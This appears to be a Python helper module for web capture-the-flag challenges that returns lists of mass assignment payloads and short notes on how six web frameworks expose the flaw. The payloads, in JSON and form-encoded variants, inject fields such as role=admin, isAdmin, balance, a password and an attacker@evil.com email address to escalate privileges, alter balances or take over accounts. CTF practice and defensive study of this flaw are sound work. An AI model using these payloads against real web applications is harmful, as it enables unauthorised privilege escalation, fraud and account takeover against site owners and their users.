"""
Mass Assignment Payload Crafter for Web CTF.
Covers parameter injection to modify protected fields (role, isAdmin, balance),
and framework-specific mass assignment techniques.
"""

from typing import List, Dict


def get_mass_assignment_payloads() -> List[Dict[str, str]]:
    """Generate mass assignment payloads for privilege escalation."""
    return [
        {
            "name": "Role Escalation",
            "payload": '{"role": "admin"}',
            "desc": "Injects role field to escalate privileges."
        },
        {
            "name": "isAdmin Boolean",
            "payload": '{"isAdmin": true}',
            "desc": "Injects isAdmin boolean to escalate privileges."
        },
        {
            "name": "Balance Modification",
            "payload": '{"balance": 999999}',
            "desc": "Injects balance field to modify account balance."
        },
        {
            "name": "Email Change",
            "payload": '{"email": "attacker@evil.com"}',
            "desc": "Injects email field to change account email."
        },
        {
            "name": "Password Change",
            "payload": '{"password": "hacked"}',
            "desc": "Injects password field to change account password."
        },
        {
            "name": "Verified / Active Flag",
            "payload": '{"verified": true, "active": true}',
            "desc": "Injects verified/active flags to bypass verification."
        },
        {
            "name": "Admin Flag",
            "payload": '{"admin": true}',
            "desc": "Injects admin flag to escalate privileges."
        },
        {
            "name": "Permissions Array",
            "payload": '{"permissions": ["admin", "root"]}',
            "desc": "Injects permissions array to grant admin access."
        },
        {
            "name": "User ID Override",
            "payload": '{"id": 1}',
            "desc": "Injects id field to modify another user's account."
        },
        {
            "name": "Subscription / Plan",
            "payload": '{"plan": "premium"}',
            "desc": "Injects plan field to upgrade subscription."
        }
    ]


def get_mass_assignment_form_payloads() -> List[Dict[str, str]]:
    """Generate form-encoded mass assignment payloads."""
    return [
        {
            "name": "Form Role Escalation",
            "payload": "role=admin",
            "desc": "Form-encoded role field injection."
        },
        {
            "name": "Form isAdmin",
            "payload": "isAdmin=true",
            "desc": "Form-encoded isAdmin boolean injection."
        },
        {
            "name": "Form Balance",
            "payload": "balance=999999",
            "desc": "Form-encoded balance field injection."
        },
        {
            "name": "Form Admin Flag",
            "payload": "admin=1",
            "desc": "Form-encoded admin flag injection."
        },
        {
            "name": "Form Verified",
            "payload": "verified=true",
            "desc": "Form-encoded verified flag injection."
        },
        {
            "name": "Form User ID",
            "payload": "id=1",
            "desc": "Form-encoded user ID injection."
        }
    ]


def get_mass_assignment_frameworks() -> List[Dict[str, str]]:
    """Document how different frameworks handle mass assignment."""
    return [
        {
            "framework": "Ruby on Rails",
            "behavior": "Strong Parameters",
            "desc": "Rails uses strong parameters; mass assignment possible if permit() is too broad."
        },
        {
            "framework": "Laravel (PHP)",
            "behavior": "$fillable / $guarded",
            "desc": "Laravel uses $fillable/$guarded; mass assignment possible if not configured."
        },
        {
            "framework": "Django (Python)",
            "behavior": "ModelForm / Serializer",
            "desc": "Django uses ModelForm; mass assignment possible if fields not restricted."
        },
        {
            "framework": "Spring (Java)",
            "behavior": "@ModelAttribute",
            "desc": "Spring binds request params to model attributes; mass assignment possible."
        },
        {
            "framework": "Express (Node.js)",
            "behavior": "Manual assignment",
            "desc": "Express requires manual assignment; mass assignment possible if using spread/merge."
        },
        {
            "framework": "ASP.NET",
            "behavior": "Model Binding",
            "desc": "ASP.NET binds request params to model properties; mass assignment possible."
        }
    ]
